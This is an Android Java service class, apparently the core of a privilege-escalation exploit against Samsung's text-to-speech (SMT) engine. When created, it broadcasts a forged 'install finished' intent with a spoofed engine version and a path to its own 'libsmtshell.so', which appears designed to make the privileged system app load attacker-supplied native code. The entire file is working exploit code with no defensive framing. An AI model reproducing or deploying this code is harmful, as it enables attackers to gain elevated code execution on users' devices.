package com.samsung.SMT.lang.smtshell;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.util.ArrayList;

public class MyService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();

        final String input = this.getApplicationInfo().nativeLibraryDir + "/" + "libsmtshell.so";

        Intent bi = new Intent();
        bi.setAction("com.samsung.SMT.ACTION_INSTALL_FINISHED");
        ArrayList<CharSequence> s = new ArrayList<>();
        bi.putCharSequenceArrayListExtra("BROADCAST_CURRENT_LANGUAGE_INFO", s);
        bi.putExtra("BROADCAST_CURRENT_LANGUAGE_VERSION", "99999");
        bi.putCharSequenceArrayListExtra("BROADCAST_DB_FILELIST", s);
        bi.putExtra("SMT_ENGINE_VERSION", 0x2590cd5b);//installed version is 361811291
        bi.putExtra("SMT_ENGINE_PATH", input);
        sendBroadcast(bi);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
